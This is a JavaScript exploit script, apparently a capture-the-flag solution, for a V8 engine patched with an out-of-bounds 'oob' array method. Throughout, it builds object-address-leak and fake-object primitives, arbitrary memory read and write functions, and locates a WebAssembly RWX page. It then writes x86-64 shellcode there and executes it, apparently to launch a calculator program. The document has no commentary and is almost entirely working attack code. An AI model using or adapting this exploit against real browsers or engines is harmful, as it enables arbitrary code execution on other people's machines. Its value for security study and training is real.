//fulfill
let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function() {
    return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function() {
    int_view[0] = this;
    return float_view[0];
}
BigInt.prototype.smi2f = function() {
    int_view[0] = this << 32n;
    return float_view[0];
}
Number.prototype.f2i = function() {
    float_view[0] = this;
    return int_view[0];
}
Number.prototype.f2smi = function() {
    float_view[0] = this;
    return int_view[0] >> 32n;
}
Number.prototype.i2f = function() {
    return BigInt(this).i2f();
}
Number.prototype.smi2f = function() {
    return BigInt(this).smi2f();
}
function debug(){
    console.log("debug...");
    readline();
}
function gc(){
    for(var i=0;i<0x10;i++){
        new ArrayBuffer(0x1000000);
    }
}
function fail(str){
    console.log("FAIL:",str);
    throw null;
}

//trigger patch
var float_arr = [1.1,2,3,4];
var obj_sample = {"what":"ever"};
var obj_arr = [obj_sample];
var float_arr_map=float_arr.oob();
var obj_arr_map=obj_arr.oob();

function obj_to_float(o)
{
    obj_arr[0] = o;
    obj_arr.oob(float_arr_map);
    var num = obj_arr[0];
    obj_arr.oob(obj_arr_map);
    return num;
}

var array_box = [
    float_arr_map,   // fake obj  |map
    2,               //           |properties
    3,               //           |elements
    4,
    5,
    6,
    7,
    8,
    9,
    1.0,
    1.1,
    1.2,
    1.3,
    1.4,
    1.5,
    1.6
];

// leak addr of array_box
var array_box_addr = obj_to_float(array_box).f2i()-1n;
console.log(array_box_addr.hex());
//%DebugPrint(array_box);

// fake object
var fake_obj_addr = array_box_addr-0x80n;
float_arr[0] = (fake_obj_addr+1n).i2f();
float_arr.oob(obj_arr_map);
var fake_obj = float_arr[0];  //get a object whose addr is fakce_obj_addr
float_arr.oob(float_arr_map);

// Arbitrary address read 
function read64(leak_addr){
    array_box[2] =  (leak_addr - 0x10n + 0x1n).i2f();
    return fake_obj[0].f2i(); 
}

// Arbitrary address write
function write64(addr,data){  //addr, data: BigInt
    array_box[2] =  (addr - 0x10n + 0x1n).i2f();
    fake_obj[0] = data.i2f();
}

// wasm -> shellcode
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_module = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_module, {});
var f = wasm_instance.exports.main;
var f_addr = obj_to_float(f).f2i()-1n;
console.log("[*] leak wasm addr: " + f_addr.hex());

var shared_info_addr = read64(f_addr + 0x18n) - 0x1n;
var wasm_exported_func_data_addr = read64(shared_info_addr + 0x8n) - 0x1n;
var wasm_instance_addr = read64(wasm_exported_func_data_addr + 0x10n) - 0x1n;
var rwx_page_addr = read64(wasm_instance_addr + 0x88n);
console.log("[*] leak rwx_page_addr: " + rwx_page_addr.hex());

var shellcode =[0x010101010101b848n, 0x68632eb848500101n, 0x0431480169722e6fn, 0x0cfe016ae7894824n, 0x63782f6e69b84824n, 0x3b30b84850636c61n, 0x4850622f7273752fn, 0x303a3d59414c50b8n, 0x74726f70b848502en, 0x01b8485053494420n, 0x5001010101010101n, 0x01622c016972b848n, 0xf631240431487964n, 0x56e601485e0e6a56n, 0x6a56e601485e136an, 0x894856e601485e18n, 0x050f583b6ad231e6n]

var data_buf = new ArrayBuffer(0xa0);
var data_view = new DataView(data_buf);
var buf_backing_store_addr = obj_to_float(data_buf).f2i()-1n + 0x20n;
write64(buf_backing_store_addr, rwx_page_addr);  
for (var i = 0; i < shellcode.length; i++) {
    data_view.setFloat64(i*8, shellcode[i].i2f(), true);
}
f();